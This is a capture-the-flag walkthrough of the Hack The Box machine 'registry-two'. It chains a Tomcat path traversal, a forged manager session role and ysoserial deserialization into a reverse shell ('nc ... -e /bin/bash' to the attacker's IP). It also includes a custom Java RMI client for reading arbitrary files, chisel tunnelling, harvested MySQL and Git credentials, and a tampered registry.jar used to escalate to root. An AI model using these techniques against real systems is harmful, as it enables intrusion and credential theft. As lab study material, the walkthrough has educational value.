-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 12451423 Aug 24 15:52 497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 33531617 Aug 24 15:49 4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n      238 Aug 24 15:57 5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n      138 Aug 24 15:53 7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n     1035 Aug 24 15:51 9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n     1279 Aug 24 15:49 9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n       32 Aug 24 15:57 a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n      207 Aug 24 15:51 ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n      544 Aug 24 15:49 b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n    98146 Aug 24 15:52 e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n      132 Aug 24 15:51 f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 54453948 Aug 24 15:57 fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626.tar.gz
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n  2065537 Aug 24 15:58 ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28.tar.gz
```

Analyzing those files, we noticed that the file `4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42.tar.gz` contains the Tomcat web server and the host.war application, which is a Java application.

![Untitled](images/Untitled%209.png)

![Untitled](images/Untitled%2010.png)

We could verify in the `0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba` directory there is a configuration file named `hosting.ini`.

![Untitled](images/Untitled%2011.png)

Checking this configuration file, we could get some MySQL database credentials and a new subdomain, so we wrote this new subdomain in our hosts file too.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/hosting-app/0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba]
╰─ $ more etc/hosting.ini 
#Mon Jan 30 21:05:01 GMT 2023
mysql.password=O8lBvQUBPU4CMbvJmYqY
rmi.host=registry.webhosting.htb
mysql.user=root
mysql.port=3306
mysql.host=localhost
domains.start-template=<body>\r\n<h1>It works\!</h1>\r\n</body>
domains.max=5
rmi.port=9002
```

![Untitled](images/Untitled%2012.png)

We use Eclipse IDE to open and read the code of this application. We import the hosting.war file to eclipse.

![Untitled](images/Untitled%2013.png)

Below we could open the .class compiled file in highlight mode

[How to decompile class in Java - Mkyong.com](https://mkyong.com/java/how-to-decompile-class-in-java/#decompile-java-class-in-eclipse-ide)

![Untitled](images/Untitled%2014.png)

We can see that this code uses ***Java RMI*** to register new hosts on the application. 

We go to the application on our web browser and create an account.

![Untitled](images/Untitled%2015.png)

We log into the application and there we can add some hosts.

![Untitled](images/Untitled%2016.png)

![Untitled](images/Untitled%2017.png)

Knowing that the web server is a Tomcat, we test some know vulnerabilities listed on the hacktricks site: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal-..](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal-%2e%2e)

We tested the path traversal vulnerability that is common on the Tomcat web server. Adding some invalid endpoint after /hosting, we got the 404 error page developed and saved as `404.jsp`

![Untitled](images/Untitled%2018.png)

Adding the /..;/ after the /hosting endpoint, we got a different response.

![Untitled](images/Untitled%2019.png)

Adding the path traversal payload `/..;/manager/html`, a default endpoint for Tomcat, we could access it which asks us for credentials.

![Untitled](images/Untitled%2020.png)

Accessing the endpoint /examples that contains some examples of servlets for Tomcat, we got.

![Untitled](images/Untitled%2021.png)

Searching on the application’s source code, in `com/htb/hosting/services/ConfigurationServlet.class`, we noticed there is the `checkManager()` function that checks if some user has *manager* role through the `s_IsLoggedInUserRoleManager` parameter, returning true if he was.

![Untitled](images/Untitled%2022.png)

So we go to the `SessionExample` servlet and try to forge a manager role through that parameter found in the source code.

![Untitled](images/Untitled%2023.png)

![Untitled](images/Untitled%2024.png)

In the source code, we can see that there is the /reconfigure endpoint and now, we can access it as a manager.

![Untitled](images/Untitled%2025.png)

![Untitled](images/Untitled%2026.png)

We capture the request from this endpoint with the burp and add the parameter `rmi.host` in order to get RCE through the Insecure Java Object Deserialization vulnerability.

![Untitled](images/Untitled%2027.png)

Using the ysoserial tool https://github.com/frohoff/ysoserial we generate our payload based on the `CommonsCollections6` payload (since we can see `commons-collections:3.1` library used by the web application) through the `JRMPListener` making an `RMIServer` listen on port 9002.

![Untitled](images/Untitled%2028.png)

The payload we created with ysoserial has to use the Java 8 version, so we downloaded the Oracle JDK 8 version and ran it.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]
╰─ $ /usr/lib/jvm/jdk1.8.0_202/bin/java -cp ./ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 'nc 10.10.14.217 443 -e /bin/bash'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
* Opening JRMP listener on 9002
Have connection from /10.10.11.223:56538
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

Now we go to the web application and create a new domain host in order to trigger our exploit and get a reverse shell on our Netcat listener.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]
╰─ $ rlwrap ncat -vnlp 443 
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.223:45797.
id
uid=1000(app) gid=1000(app) groups=1000(app)
```

We improved our shell a little bit by running this bash command.

```bash
bash -i 0>&1 2<&1
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4$ id
id
uid=1000(app) gid=1000(app) groups=1000(app)
bash-4.4$
```

We verify that we have escaped the Docker image that we are. Running `netstat` we verify those open ports on the box.

```bash
bash-4.4$ netstat -nlpt
netstat -nlpt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5001            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3310            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::443                  :::*                    LISTEN      -
tcp        0      0 ::ffff:127.0.0.1:8005   :::*                    LISTEN      1/java
tcp        0      0 :::5000                 :::*                    LISTEN      -
tcp        0      0 :::42825                :::*                    LISTEN      -
tcp        0      0 :::8009                 :::*                    LISTEN      1/java
tcp        0      0 :::5001                 :::*                    LISTEN      -
tcp        0      0 :::9002                 :::*                    LISTEN      -
tcp        0      0 :::3306                 :::*                    LISTEN      -
tcp        0      0 :::3310                 :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      1/java
tcp        0      0 :::22                   :::*                    LISTEN      -
```

We see that port 9002 is not run by us (java), which means that there is a different user running the server (-) which is able to read files that we don't have access to.

So we can make a custom ***RMIClient*** to interact with this service and read files. To do this, I will copy the Java code of the following classes:

- AbstractFile.class
- FileService.class
- CryptUtil.class (To be able to encrypt file paths, since the service expects an encrypted path)
- RMIClientWrapper.class (But we will modify this to be able to read any file from the service)

We will make only one `.java` file that contains all the code and will place it inside `com/htb/hosting/rmi/` directory (This step is important, otherwise you can't compile the code because of the `package` declaration):

```java
package com.htb.hosting.rmi;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.logging.Logger;
import java.io.File;
import java.io.Serializable;
import java.io.IOException;
import java.rmi.Remote;
import java.util.List;
import java.util.Arrays;
import java.util.ArrayList;
import java.nio.charset.StandardCharsets;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Base64;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;

class AbstractFile implements Serializable {
    private static final long serialVersionUID = 2267537178761464006L;
    private final String fileRef;
    private final String vhostId;
    private final String displayName;
    private final File file;
    private final String absolutePath;
    private final String relativePath;
    private final boolean isFile;
    private final boolean isDirectory;
    private final long displaySize;
    private final String displayPermission;
    private final long displayModified;
    private final AbstractFile parentFile;

    public boolean isFile() {
        return this.isFile;
    }

    public String getName() {
        return this.file.getName();
    }

    public boolean canExecute() {
        return this.getFile().canExecute();
    }

    public boolean exists() {
        return this.isFile || this.isDirectory;
    }

    public AbstractFile(String fileRef, String vhostId, String displayName,
            File file, String absolutePath,
            String relativePath, boolean isFile, boolean isDirectory,
            long displaySize, String displayPermission,
            long displayModified, AbstractFile parentFile) {
        this.fileRef = fileRef;
        this.vhostId = vhostId;
        this.displayName = displayName;
        this.file = file;
        this.absolutePath = absolutePath;
        this.relativePath = relativePath;
        this.isFile = isFile;
        this.isDirectory = isDirectory;
        this.displaySize = displaySize;
        this.displayPermission = displayPermission;
        this.displayModified = displayModified;
        this.parentFile = parentFile;
    }

    public String getFileRef() {
        return this.fileRef;
    }

    public String getVhostId() {
        return this.vhostId;
    }

    public String getDisplayName() {
        return this.displayName;
    }

    public File getFile() {
        return this.file;
    }

    public String getAbsolutePath() {
        return this.absolutePath;
    }

    public String getRelativePath() {
        return this.relativePath;
    }

    public boolean isDirectory() {
        return this.isDirectory;
    }

    public long getDisplaySize() {
        return this.displaySize;
    }

    public String getDisplayPermission() {
        return this.displayPermission;
    }

    public long getDisplayModified() {
        return this.displayModified;
    }

    public AbstractFile getParentFile() {
        return this.parentFile;
    }
}

interface FileService extends Remote {
    List<AbstractFile> list(String var1, String var2) throws RemoteException;

    boolean uploadFile(String var1, String var2, byte[] var3) throws IOException;

    boolean delete(String var1) throws RemoteException;

    boolean createDirectory(String var1, String var2) throws RemoteException;

    byte[] view(String var1, String var2) throws IOException;

    AbstractFile getFile(String var1, String var2) throws RemoteException;

    AbstractFile getFile(String var1) throws RemoteException;

    void deleteDomain(String var1) throws RemoteException;

    boolean newDomain(String var1) throws RemoteException;

    byte[] view(String var1) throws RemoteException;
}

class CryptUtil {
    public static CryptUtil instance = new CryptUtil();
    Cipher ecipher;
    Cipher dcipher;
    byte[] salt = new byte[] { -87, -101, -56, 50, 86, 53, -29, 3 };
    int iterationCount = 19;
    String secretKey = "48gREsTkb1evb3J8UfP7";

    public static CryptUtil getInstance() {
        return instance;
    }

    public String encrypt(String plainText) {
        try {
            KeySpec keySpec = new PBEKeySpec(this.secretKey.toCharArray(), this.salt, this.iterationCount);
            SecretKey key = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
            AlgorithmParameterSpec paramSpec = new PBEParameterSpec(this.salt, this.iterationCount);
            this.ecipher = Cipher.getInstance(key.getAlgorithm());
            this.ecipher.init(1, key, paramSpec);
            String charSet = "UTF-8";
            byte[] in = plainText.getBytes("UTF-8");
            byte[] out = this.ecipher.doFinal(in);
            String encStr = Base64.getUrlEncoder().encodeToString(out);
            return encStr;
        } catch (Exception var9) {
            throw new RuntimeException(var9);
        }
    }

    public String decrypt(String encryptedText) throws NoSuchAlgorithmException, InvalidKeySpecException,
            NoSuchPaddingException, InvalidKeyException,
            InvalidAlgorithmParameterException,
            UnsupportedEncodingException, IllegalBlockSizeException,
            BadPaddingException, IOException {
        KeySpec keySpec = new PBEKeySpec(this.secretKey.toCharArray(),
                this.salt, this.iterationCount);
        SecretKey key = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
        AlgorithmParameterSpec paramSpec = new PBEParameterSpec(this.salt,
                this.iterationCount);
        this.dcipher = Cipher.getInstance(key.getAlgorithm());
        this.dcipher.init(2, key, paramSpec);
        byte[] enc = Base64.getUrlDecoder().decode(encryptedText);
        byte[] utf8 = this.dcipher.doFinal(enc);
        String charSet = "UTF-8";
        String plainStr = new String(utf8, "UTF-8");
        return plainStr;
    }
}

public class RMIClientWrapper {
    private static final Logger log = Logger.getLogger(RMIClientWrapper.class.getSimpleName());

    public static FileService get() {
        try {
            String rmiHost = "registry.webhosting.htb";
            // String rmiHost = "127.0.0.1";
            System.setProperty("java.rmi.server.hostname", rmiHost);
            System.setProperty("com.sun.management.jmxremote.rmi.port",
                    "9002");
            log.info(String.format("Connecting to %s:%d", rmiHost,
                    9002));
            Registry registry = LocateRegistry.getRegistry(rmiHost,
                    9002);
            return (FileService) registry.lookup("FileService");
        } catch (Exception var2) {
            var2.printStackTrace();
            throw new RuntimeException(var2);
        }
    }

public static void main(String args[]) {
	try {
		if(args.length < 2){
			System.out.println("Provide a directory to list as first argument and file path as a second argument.");
			System.exit(0);
		}

		String dir_to_list = args[0];
		String filename = args[1];
		CryptUtil aa = new CryptUtil();
		list_files(dir_to_list);
		readFile(aa.encrypt(filename));
	} catch (RemoteException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	};
}

// To compile the code:(make sure that com/ directory is in your current directory)

    public static void list_files(String path) throws RemoteException {
        List<AbstractFile> list_files = get().list("950ba61ab119", path);
        for (AbstractFile file : list_files) {
            System.out.println(file.getAbsolutePath());
        }
        System.out.println();
    }

    public static void displayFileInfo(String enc_name) throws RemoteException {
        AbstractFile tmp = get().getFile(enc_name);
        System.out.println("getFileRef: " + tmp.getFileRef());
        System.out.println("getVhostId: " + tmp.getVhostId());
        System.out.println("getDisplayName: " + tmp.getDisplayName());
        System.out.println("getFile: " + tmp.getFile());
        System.out.println("getAbsolutePath: " + tmp.getAbsolutePath());
        System.out.println("getRelativePath: " + tmp.getRelativePath());
        System.out.println("getDisplaySize: " + tmp.getDisplaySize());
        System.out.println("getDisplayPermission: " +
                tmp.getDisplayPermission());
        System.out.println("getDisplayModified: " +
                tmp.getDisplayModified());
        System.out.println("getParentFile: " + tmp.getParentFile());
    }

    public static void readFile(String enc_name) throws RemoteException {
        System.out.println("\nReading content:");
        byte[] byteArray = get().view(enc_name);
        String s = new String(byteArray, StandardCharsets.UTF_8);
        System.out.println(s);
    }
}
```

We compiled our Java code.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]
╰─ $ /usr/lib/jvm/jdk1.8.0_202/bin/javac com/htb/hosting/rmi/RMIClientWrapper.java
```

Now, we port forward port 9002 from the target machine to our attacking machine using the chisel. 

```bash
# From Attack Machine
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]
╰─ $ ./chisel server -p 9001 --reverse                                                                                                                   
2023/08/25 15:28:05 server: Reverse tunnelling enabled
2023/08/25 15:28:05 server: Fingerprint 2mGE5kKMGoUdB8dF8xvJWTO+LZ/lL8RXCihQQcgWNPU=
2023/08/25 15:28:05 server: Listening on http://0.0.0.0:9001
2023/08/25 15:28:41 server: session#1: tun: proxy#R:8001=>9003: Listening

# From target
bash-4.4$ ./chisel client 10.10.14.217:9001 R:8001:127.0.0.1:9003 &
./chisel client 10.10.14.217:9001 R:8001:127.0.0.1:9003 &
[1] 7787
bash-4.4$ 2023/08/25 19:28:41 client: Connecting to ws://10.10.14.217:9001
2023/08/25 19:28:42 client: Connected (Latency 161.675881ms)

bash-4.4$ ./chisel server -p 9003 --socks5 &
./chisel server -p 9003 --socks5 &
[2] 7803
bash-4.4$ 2023/08/25 19:29:19 server: Fingerprint XdxeaJdY+GEMvN8TXvBAWFo1u/PYa4EZnefOcIltxzo=
2023/08/25 19:29:19 server: Listening on http://0.0.0.0:9003

# From attack box again
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]
╰─ $ ./chisel client localhost:8001 socks
2023/08/25 15:31:06 client: Connecting to ws://localhost:8001
2023/08/25 15:31:06 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2023/08/25 15:31:07 client: Connected (Latency 161.626337ms)
```

We changed the IP for domain `registry.webhosting.htb` in our hosts file to 127.0.0.1

![Untitled](images/Untitled%2029.png)

We configured our proxychains with socks5:

```bash
socks5 127.0.0.1 1080
```

Executing our Java code before, we pass as the first parameter the directory that we want to list and as the second parameter the file that we want to read.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]                                                                                                                                            [8/17]
╰─ $ proxychains java com/htb/hosting/rmi/RMIClientWrapper "/../../home/developer/" "/../../etc/passwd"                                                                                                                                      
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                                                      
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                                                       
[proxychains] DLL init: proxychains-ng 4.16                                                                                                                                                                                                  
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                                                                
Aug 25, 2023 3:36:02 PM com.htb.hosting.rmi.RMIClientWrapper get                                                                                                                                                                             
INFO: Connecting to registry.webhosting.htb:9002                                                                                                                                                                                             
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:9002  ...  OK                                                                                                                                                                
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:42559  ...  OK
/home                                                      
/home/developer/.cache                                     
/home/developer/.bash_logout                               
/home/developer/.bashrc                                    
/home/developer/.bash_history
/home/developer/.git-credentials
/home/developer/user.txt                                   
/home/developer/.gnupg                                     
/home/developer/.profile                                   
/home/developer/.vimrc                                     

Reading content:                                           
Aug 25, 2023 3:36:04 PM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
clamav:x:111:113::/var/lib/clamav:/bin/false
rmi-service:x:999:998::/home/rmi-service:/bin/false
developer:x:1001:1001:,,,:/home/developer:/bin/bash
_laurel:x:998:997::/var/log/laurel:/bin/false
```

We noticed the `.git-credentials` file and we read it.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation]
╰─ $ proxychains java com/htb/hosting/rmi/RMIClientWrapper "/../../home/developer/" "/../../home/developer/.git-credentials"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Aug 25, 2023 3:43:11 PM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:9002  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:40463  ...  OK
/home
/home/developer/.cache
/home/developer/.bash_logout
/home/developer/.bashrc
/home/developer/.bash_history
/home/developer/.git-credentials
/home/developer/user.txt
/home/developer/.gnupg
/home/developer/.profile
/home/developer/.vimrc

Reading content:
Aug 25, 2023 3:43:14 PM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com
```

We are able to connect to the SSH service as the user `developer` with this password.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two]
╰─ $ ssh developer@10.10.11.223                                                                                             
developer@10.10.11.223's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 25 19:50:54 UTC 2023

  System load:  0.06              Users logged in:                0
  Usage of /:   75.0% of 7.71GB   IP address for eth0:            10.10.11.223
  Memory usage: 60%               IP address for br-59a3a780b7b3: 172.19.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    192

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

28 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 25 19:45:27 2023 from 10.10.14.217
developer@registry:~$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer)
```

# Privilege Escalation

We upload the pspy64 tool to the target machine in order to check the process running by the existing users. We identify a non-common binary running with user root privileges.

![Untitled](images/Untitled%2030.png)

And we see that the registry service is reloaded a few times.

![Untitled](images/Untitled%2031.png)

Checking what is this registry service, we can see that is a `.jar` file in `/opt/registry.jar`.

![Untitled](images/Untitled%2032.png)

We copied this Java application to our local machine using base64 encode/decode and opened it using Eclipse IDE.

![Untitled](images/Untitled%2033.png)

We see that it contains an ***RMIClient*** code that will connect to the registry on port 9002, and will query configuration to scan files using ClamAV:

![Untitled](images/Untitled%2034.png)

We can also see that the configuration consists of:

- Quarantine Directory (Where files will be copied to and quarantined, default is `/root/quarantine/` )
- Monitor Directory (The directory in which the files will be scanned, default is `/sites/` )
- Calm Host (ClamAV host, default is localhost )
- Calm Port (ClamAV port, default is 3310 )

The code is in `quarantine/QuarantineConfiguration.class`

![Untitled](images/Untitled%2035.png)

So in this case, we can try to hijack port 9002 (since the registry service is reloaded every few minutes) and serve our own malicious modified `registry.jar` which will give malicious configuration to the `quarantine.jar` file, having these:

- Quarantine Directory = `/tmp/.th3g3ntl3m4n` (Where we have read access)
- Monitor Directory = `/root/` (Which will scan all files under `/root/` directory)
- Clam Host = 10.10.XX.XX (Our IP address)
- Clam Port = 3310 (Will stay default, or we can change it, doesn't matter)

We downloaded the `registry.jar` file to our attack machine and then extracted it.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc]
╰─ $ scp developer@webhosting.htb:/opt/registry.jar .
The authenticity of host 'webhosting.htb (10.10.11.223)' can't be established.
ED25519 key fingerprint is SHA256:MAsPYw/jBZT2Jey1YCF7JJ36wOqpd37giePk2KngbpM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'webhosting.htb' (ED25519) to the list of known hosts.
developer@webhosting.htb's password: 
registry.jar                                                                                                                                                                                               100%   15KB  11.6KB/s   00:01    
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc]
╰─ $ ls -la
total 60
drwxr-xr-x 2 th3g3ntl3m4n th3g3ntl3m4n  4096 Aug 25 16:39 .
drwxr-xr-x 4 th3g3ntl3m4n th3g3ntl3m4n  4096 Aug 25 16:38 ..
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 17783 Aug 25 16:12 quarantine.b64
-rw-r--r-- 1 th3g3ntl3m4n th3g3ntl3m4n 13164 Aug 25 16:13 quarantine.jar
-rwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 15343 Aug 25 16:39 registry.jar

╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc/registry]
╰─ $ jar xvf registry.jar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
  created: META-INF/
 inflated: META-INF/MANIFEST.MF
  created: com/
  created: com/htb/
  created: com/htb/hosting/
  created: com/htb/hosting/rmi/
  created: com/htb/hosting/rmi/utils/
  created: com/htb/hosting/rmi/quarantine/
 inflated: com/htb/hosting/rmi/FileService.class
 inflated: com/htb/hosting/rmi/Server.class
 inflated: com/htb/hosting/rmi/utils/CryptUtil.class
 inflated: com/htb/hosting/rmi/utils/FileUtil.class
 inflated: com/htb/hosting/rmi/utils/StringUtil.class
 inflated: com/htb/hosting/rmi/FileServiceImpl.class
 inflated: com/htb/hosting/rmi/AbstractFile.class
 inflated: com/htb/hosting/rmi/FileServiceConstants.class
 inflated: com/htb/hosting/rmi/quarantine/QuarantineConfiguration.class
 inflated: com/htb/hosting/rmi/quarantine/QuarantineService.class
 inflated: com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.class
```

Then we will modify the `com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.java` which contains the configuration used by the registry. The original code is the following.

![Untitled](images/Untitled%2036.png)

We modified the code as follows:

```java
package com.htb.hosting.rmi.quarantine;

import com.htb.hosting.rmi.FileServiceConstants;
import java.io.File;
import java.rmi.RemoteException;
import java.util.logging.Logger;

public class QuarantineServiceImpl implements QuarantineService {
	private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
	private static final QuarantineConfiguration DEFAULT_CONFIG;

	public QuarantineConfiguration getConfiguration() throws RemoteException {
		logger.info("client fetching configuration");
		return DEFAULT_CONFIG;
	}

	static {
		DEFAULT_CONFIG = new QuarantineConfiguration(new File("/quarantine"), new File("/root/"), "10.10.14.217", 3310, 1000);
	}
}
```

Now we compiled our modified class and generated a new `.jar` file from the whole project.

```java
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc/registry]
╰─ $ javac com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/registry-two/exploitation/privesc/registry]
╰─ $ jar cmvf META-INF/MANIFEST.MF registry.jar . 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
added manifest
ignoring entry META-INF/
ignoring entry META-INF/MANIFEST.MF
adding: com/(in = 0) (out= 0)(stored 0%)
adding: com/htb/(in = 0) (out= 0)(stored 0%)
adding: com/htb/hosting/(in = 0) (out= 0)(stored 0%)
adding: com/htb/hosting/rmi/(in = 0) (out= 0)(stored 0%)
